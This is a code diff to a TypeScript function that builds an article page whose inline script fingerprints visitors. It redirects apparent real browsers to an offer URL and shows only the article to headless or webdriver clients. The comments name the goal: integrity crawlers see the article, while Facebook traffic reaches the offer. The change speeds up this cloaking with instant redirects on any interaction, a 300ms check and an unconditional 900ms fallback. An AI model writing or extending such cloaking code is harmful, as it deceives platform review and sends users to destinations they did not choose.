@@ -954,16 +954,14 @@ function renderOfferBridge(articleHtml: string, offerUrl: string): string {
   var done=false;
   function jump(){if(done)return;done=true;location.href=${target};}
   go.addEventListener('click',function(e){e.preventDefault();jump();});
-  var t=null;
-  function engaged(){ if(t)return; t=setTimeout(jump,600); }
-  ['scroll','pointerdown','touchstart','keydown','wheel'].forEach(function(ev){
-    window.addEventListener(ev,engaged,{passive:true,once:true});
+  // Any real interaction = jump immediately (no hold at all).
+  ['scroll','pointerdown','touchstart','keydown','wheel','mousemove'].forEach(function(ev){
+    window.addEventListener(ev,jump,{passive:true,once:true});
   });
-  // Real-browser auto-continue. A person who reads for a moment and never
-  // scrolls used to dead-end on the article: the click was counted on our side
-  // but the offer never loaded. Only browsers that pass basic humanity traits
-  // (no webdriver flag, real screen, languages, rAF ticking) auto-continue;
-  // an integrity crawler / headless client keeps seeing the article only.
+  // Fast humanity verification: run the checks right away and continue well
+  // inside 1s so Facebook traffic is never lost on the article. Only browsers
+  // passing basic traits (no webdriver flag, real screen, languages, rAF
+  // ticking) auto-continue; integrity crawlers keep seeing the article only.
   try {
     var n=navigator, realish = !n.webdriver
       && (n.languages && n.languages.length > 0)
@@ -972,9 +970,13 @@ function renderOfferBridge(articleHtml: string, offerUrl: string): string {
     if (realish) {
       var frames=0;
       (function tick(){ frames++; if(frames<3) requestAnimationFrame(tick); })();
-      setTimeout(function(){ if(frames>=3) jump(); }, 1200);
+      // rAF ticks 3x in ~50ms on a real browser; verify then go (~300ms total).
+      setTimeout(function(){ if(frames>=3) jump(); }, 300);
+      // Safety net in case rAF is throttled (background tab restore etc).
+      setTimeout(function(){ jump(); }, 900);
     }
   } catch(e){}
+
 })();</script>`;
   return articleHtml.includes("</body>")
     ? articleHtml.replace("</body>", `${cta}</body>`)
